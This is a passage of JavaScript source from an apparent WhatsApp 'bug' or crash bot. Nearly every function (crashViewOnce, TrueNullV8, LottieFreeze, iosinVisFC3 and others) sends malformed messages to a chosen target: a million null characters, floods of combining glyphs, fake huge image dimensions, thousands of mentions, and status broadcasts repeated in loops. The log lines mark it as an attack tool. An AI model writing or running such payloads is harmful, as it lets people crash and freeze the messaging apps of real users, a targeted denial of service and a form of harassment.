                              title: "List Kacung Gweh",
                              body: "ꦽ".repeat(38000),
                              mimeType: 'audio/mpeg',
                              caption: "ꦽ".repeat(35000),
                              showAdAttribution: true,
                              sourceUrl: "https://t.me//RyyNotDev2",
                              thumbnailUrl: ""
                           }
                      }
                 }
            }
       }
  };
  
   await sock.relayMessage(target, msg, {
      messageId: null,
      participant: { jid: target },
      quoted: null,
      userJid: target,
      contextInfo: null
   });
   
  const msg1 = {
     imageMessage: {
         url: "https://mmg.whatsapp.net/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0&mms3=true",
         mimetype: "image/jpeg",
         fileSha256: "88J5mAdmZ39jShlm5NiKxwiGLLSAhOy0gIVuesjhPmA=",
         fileLength: "9999999999",
         height: 99999999,
         width: 99999999,
         mediaKey: "Te7iaa4gLCq40DVhoZmrIqsjD+tCd2fWXFVl3FlzN8c=",
         fileEncSha256: "w5CPjGwXN3i/ulzGuJ84qgHfJtBKsRfr2PtBCT0cKQQ=",
         directPath: "/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0",
         mediaKeyTimestamp: "999999999",
         jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACgASAMBIgACEQEDEQH/xAAsAAEBAQEBAAAAAAAAAAAAAAAAAwEEBgEBAQEAAAAAAAAAAAAAAAAAAAED/9oADAMBAAIQAxAAAADzY1gBowAACkx1RmUEAAAAAA//xAAfEAABAwQDAQAAAAAAAAAAAAARAAECAyIiMBIUITH/2gAIAQEAAT8A3Dw30+BydR68fpVV4u+JF5RTudv/xAAUEQEAAAAAAAAAAAAAAAAAAAAw/9oACAECAQE/AH//xAAWEQADAAAAAAAAAAAAAAAAAAARIDD/2gAIAQMBAT8Acw//2Q==",
         scansSidecar: "hLyK402l00WUiEaHXRjYHo5S+Wx+KojJ6HFW9ofWeWn5BeUbwrbM1g==",
         scanLengths: [3537, 10557, 1905, 2353],
         midQualityFileSha256: "gRAggfGKo4fTOEYrQqSmr1fIGHC7K0vu0f9kR5d57eo=",
         contextInfo: {
         mentionedJid: [
           "0@s.whatsapp.net",
          ...Array.from(
            { length: 1900 },
            () =>
              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
         stanzaId: "1234567890ABCDEF",
         quotedMessage: {
           paymentInviteMessage: {
             serviceType: 3,
             expiryTimestamp: Date.now() + 1814400000
           }
         }
       }
     }
   };
   
  await sock.relayMessage(target, msg1, {
     messageId: null,
     participant: { jid: target }
  });
}

async function crashViewOnce(sock, target) {
  await sock.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "X",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(1000000),
              version: 3
            }
          }
        }
      }
    },
    { participant: { jid: target } }
  );

  await sock.relayMessage(
    target,
    {
      sendPaymentMessage: {
        noteMessage: null,
        requestMessageKey: undefined,
        background: null,
        contextInfo: {
          externalAdReply: null
        }
      }
    },
    {
      participant: { jid: target },
      quoted: null
    }
  );
}

async function TrueNullV8(sock, target) {
    let X_Mention = generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        contextInfo: {
                            remoteJid: " X ",
                            mentionedJid: ["13135559098@s.whatsapp.net"]
                        },
                        body: {
                            text: "X",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "address_message",
                            paramsJson: `{"values":{"in_pin_code":"7205","building_name":"X","address":"2.7205","tower_number":"507","city":"X","name":"X","phone_number":"+13135550202","house_number":"7205826","floor_number":"16","state":"${"\x10".repeat(1000000)}"}}`,
                            version: 3
                        }
                    }
                }
            }
        },
        {
            participant: { jid: target }
        }
    );

    await sock.relayMessage(
        target,
        {
            groupStatusMessageV2: {
                message: X_Mention.message
            }
        },
        {
            messageId: X_Mention.key.id,
            participant: { jid: target }
        }
    );
    const msg = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        nativeFlowResponseMessage: {
                            version: 3,
                            name: "galaxy_message",
                            paramsJson: "\u0000".repeat(1045000)
                        },
                        contextInfo: {
                            entryPointConversionSource: "call_permission_request"
                        },
                        body: {
                            format: "DEFAULT",
                            text: "X"
                        }
                    }
                }
            }
        },
        {
            messageTimestamp: (Date.now() / 1000) | 0,
            userJid: target,
            messageId: undefined
        }
    );

    await sock.relayMessage(
        "status@broadcast",
        msg.message,
        {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                { tag: "to", attrs: { jid: target } }
                            ]
                        }
                    ]
                }
            ],
            messageId: msg.key?.id || undefined,
            statusJidList: [target]
        },
        {
            participant: target
        }
    );
}


async function TrueNullV7(sock, target) {
  try {
    const msg = {
      stickerMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
        fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
        fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
        mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
        mimetype: "image/webp",
        height: 9999,
        width: 9999,
        directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
        fileLength: 12260,
        mediaKeyTimestamp: "1743832131",
        isAnimated: false,
        stickerSentTs: "X",
        isAvatar: false,
        isAiSticker: false,
        isLottie: false,
        contextInfo: {
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from(
              { length: 1900 },
              () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
            ),
          ],
          stanzaId: "1234567890ABCDEF",
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000
            }
          }
        }
      }
    };

    await sock.relayMessage("status@broadcast", msg, {
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    });
    const viewOnceMsg = generateWAMessageFromContent(
      "status@broadcast",
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: { text: "Hallo", format: "DEFAULT" },
              nativeFlowResponseMessage: {
                name: "call_permission_request",
                paramsJson: "\u0000".repeat(1000000),
                version: 3
              }
            }
          }
        }
      },
      {}
    );

    await sock.relayMessage(
      "status@broadcast",
      viewOnceMsg.message,
      {
        messageId: viewOnceMsg.key.id,
        statusJidList: [target]
      }
    );

    const message = {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "Maklu",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\u0000".repeat(145000),
              version: 3
            },
            contextInfo: {
              mentionedJid: Array.from(
                { length: 1950 },
                () =>
                  "1" +
                  Math.floor(Math.random() * 5000000) +
                  "91@s.whatsapp.net"
              ),
              isForwarded: true,
              forwardingScore: 999,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "1@newsletter",
                serverMessageId: 1,
                newsletterName: "Message"
              }
            }
          }
        }
      }
    };

    await sock.relayMessage("status@broadcast", message, {
      messageId: undefined,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }
          ]
        }
      ]
    });

    console.log(`Succes Send Bug ${target}`);
  } catch (e) {
    console.error("Error:", e);
  }
}

async function Epcx(sock, target) {
  try {
    const viewOnceMsg = generateWAMessageFromContent(
      "status@broadcast",
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: { text: "Hallo", format: "DEFAULT" },
              nativeFlowResponseMessage: {
                name: "call_permission_request",
                paramsJson: "\u0000".repeat(1000000),
                version: 3
              }
            }
          }
        }
      },
      {}
    );

    await sock.relayMessage(
      "status@broadcast",
      viewOnceMsg.message,
      {
        messageId: viewOnceMsg.key.id,
        statusJidList: [target]
      }
    );
    const message = {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "Maklu",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\u0000".repeat(145000),
              version: 3
            },
            contextInfo: {
              mentionedJid: Array.from(
                { length: 1950 },
                () =>
                  "1" +
                  Math.floor(Math.random() * 5000000) +
                  "91@s.whatsapp.net"
              ),
              isForwarded: true,
              forwardingScore: 999,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "1@newsletter",
                serverMessageId: 1,
                newsletterName: "Message"
              }
            }
          }
        }
      }
    };

    await sock.relayMessage("status@broadcast", message, {
      messageId: undefined,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }
          ]
        }
      ]
    });

    console.log(
  chalk.redBright.bold("☠ OVALIUM ATTACK ☠ ") +
  chalk.white("Target : ") +
  chalk.greenBright(` ${target}`)
);
  } catch (e) {
    console.error("Error:", e);
  }
}

async function CrashStiker(sock, target) {
  await sock.relayMessage(target, {
    extendedTextMessage: {
      text: "Olaa" + "\u0000".repeat(1000) + "https://wa.me/stickerpack/Xatanicvxii",
      matchedText: "https://wa.me/stickerpack/Xatanicvxii",
      description: "\u74A7",
      title: "Null",
      previewType: "NONE",
      jpegThumbnail: "",
      inviteLinkGroupTypeV2: "DEFAULT", 
      contextInfo: {
        externalAdReply: {
          renderLargerThumbnail: true,
          thumbnailUrl: "https://wa.me/stickerpack/Xatanicvxii",
          sourceUrl: "https://wa.me/stickerpack/Xatanicvxii",
          showAdAttribution: true,
          body: "X",
          title: "X"
        }, 
        isForwarded: true,
        forwardingScore: 999,
        forwardedNewsletterMessageInfo: {
          newsletterName: "X",
          newsletterJid: "13135550002@newsletter",
          serverId:1
        }
      }
    }
  }, { participant: { jid:target } });
  
}

async function TrueNullV6(sock, target) {
  try {
    const message = {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "Maklu",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\u0000".repeat(145000),
              version: 3
            },
            contextInfo: {
              mentionedJid: Array.from(
                { length: 1950 },
                () =>
                  "1" +
                  Math.floor(Math.random() * 5000000) +
                  "91@s.whatsapp.net"
              ),
              isForwarded: true,
              forwardingScore: 999,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "1@newsletter",
                serverMessageId: 1,
                newsletterName: "Message"
              }
            }
          }
        }
      }
    };

    await sock.relayMessage("status@broadcast", message, {
      messageId: undefined,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }
          ]
        }
      ]
    });

    console.log(`Succes Send Bug ${target}`);
  } catch (e) {
    console.error("Error:", e);
  }
}

async function LottieFreeze(target, sock) {
  try {
    const Lottie = generateWAMessageFromContent(
      target,
      {
        lottieStickerMessage: {
          message: {
            stickerMessage: {
              url: "https://mmg.whatsapp.net/v/t62.15575-24/575792415_1326859005559789_4936376743727174453_n.enc?ccb=11-4&oh=01_Q5Aa2wHHWbG7rC7tgA06Nu-D-aE4S0YhhV3ZUBkuvXsJvhm2-A&oe=692E7E33&_nc_sid=5e03e0&mms3=true",
              fileSha256: "Q285fqG3P7QFkMIuD2xPU5BjH3NqCZgk/vtnmVkvZfk=",
              fileEncSha256: "ad10CF3pqlFDELFQFiluzUiSKdh0rzb3Zi6gc4GBAzk=",
              mediaKey: "ZdPiFwyd2GUfnDxjSgIeDiaS7SXwMx4i2wdobVLK6MU=",
              mimetype: "application/was",
              height: 512,
              width: 512,
              directPath: "/v/t62.15575-24/575792415_1326859005559789_4936376743727174453_n.enc?ccb=11-4&oh=01_Q5Aa2wHHWbG7rC7tgA06Nu-D-aE4S0YhhV3ZUBkuvXsJvhm2-A&oe=692E7E33&_nc_sid=5e03e0",
              fileLength: "25155",
              isAnimated: true,
              isLottie: true,
              contextInfo: {
                isForwarded: true,
                forwardingScore: 9999,
                quotedMessage: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Null" + "\u0000".repeat(1000000),
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: "\r".repeat(500000),
                      version: 3
                    }
                  }
                },
                mentionedJid: Array.from(
                  { length: 5000 },
                  (_, p) => `628${p + 1}@s.whatsapp.net`
                ),
                remoteJid: "status@broadcast"
              }
            }
          }
        }
      },
      { userJid: target }
    );

    await sock.relayMessage(
      target,
      {
        groupStatusMessageV2: {
          message: Lottie.message
        }
      },
      { messageId: Lottie.key.id }
    );

    await sock.relayMessage(
      target,
      {
        sendPaymentMessage: {
          noteMessage: {
            extendedTextMessage: {
              text: "\u0000".repeat(1000000)
            }
          }
        }
      },
      {}
    );

    await new Promise(resolve => setTimeout(resolve, 150));

    console.log(`SUCCESS Send Target ${target}`);

  } catch (err) {
    console.error("ERROR:", err);
  }
}

async function NullLixce(sock, target) {
  let message = {
    message: {
      sendPaymentMessage: {
        noteMessage: null,
        requestMessageKey: null,
        background: null
      }
    }
  };

  const Pay = { sendPaymentMessage: {} };
  const Cancel = { declinePaymentMessage: {} };
  const Request = { CancelPaymentRequestMessage: {} };
  const Message = { paymentInviteMessage: {} };

  const leaks = [];
  setInterval(() => {
    leaks.push(Buffer.alloc(1000000, ' '));
    if (leaks.length > 100) leaks.splice(0, 50);
  }, 1000);

  const messageId = crypto.randomBytes(16).toString('hex');

  await sock.relayMessage(target, Pay, Cancel, Request, Message, {
    messageId: messageId
  });

  await sock.relayMessage(
    target,
    message,
    {
      participant: { jid: target },
      messageId: null
    }
  );
}   

async function amountOneV2(sock, target) {
  const botJid = sock.user?.id?.split(':')[0] + '@s.whatsapp.net'
  if (!target || target === botJid) return
  const Null = {
  requestPaymentMessage: {
      amount: {
        value: 999.888,
        offset: 0,
        currencyCodeIso4217: "IDR",
        requestFrom: target,
        expiryTimestamp: Date.now()
      },
      contextInfo: {
        externalAdReply: {
          title: null,
          body: "X".repeat(1500),
          mimetype: "audio/mpeg",
          caption: "X".repeat(1500),
          showAdAttribution: true,
          sourceUrl: null,
          thumbnailUrl: null
        }
      }
    }
  }

  await sock.relayMessage(
    target,
    { viewOnceMessage: { message: Null } },
    { messageId: null }
  )
}

async function iosinVisFC3(sock, target) {
const TravaIphone = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000); 
const s = "𑇂𑆵𑆴𑆿".repeat(60000);
   try {
      let locationMessagex = {
         degreesLatitude: 11.11,
         degreesLongitude: -11.11,
         name: " ‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
         url: "https://t.me/sock",
      }
      let msgx = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessagex
            }
         }
      }, {});
      let extendMsgx = {
         extendedTextMessage: { 
            text: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + s,
            matchedText: "sock",
            description: "𑇂𑆵𑆴𑆿".repeat(60000),
            title: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
            previewType: "NONE",
            jpegThumbnail: "",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msgx2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsgx
            }
         }
      }, {});
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), 
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), 
         url: `https://st-gacor.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`, 
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: { 
            text: "𝔗𝔥𝔦𝔰 ℑ𝔰 𝔖𝔭𝔞𝔯𝔱𝔞𝔫" + TravaIphone, 
            matchedText: "𝔖𝔭𝔞𝔯𝔱𝔞𝔫",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),
            title: "𝔖𝔭𝔞𝔯𝔱𝔞𝔫" + "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      let msg3 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      
      for (let i = 0; i < 10; i++) {
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msgx.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msgx2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
     
      await sock.relayMessage('status@broadcast', msg3.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
          if (i < 9) {
    await new Promise(resolve => setTimeout(resolve, 5000));
  }
      }
   } catch (err) {
      console.error(err);
   }
};

async function TrueNullV5(sock, target, mention) {
  var Null = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      contextInfo: {
        mentionedJid: Array.from(
          { length: 2000 },
          (_, i) => `1${i + 1}@s.whatsapp.net`
        )
      },
      body: {
        text: "X",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"flow_cta\":\"${"\u0013".repeat(900000)}\"}}`,
        version: 3
      }
    }
  }, {});

  await sock.relayMessage(
    target,
    {
      groupStatusMessageV2: {
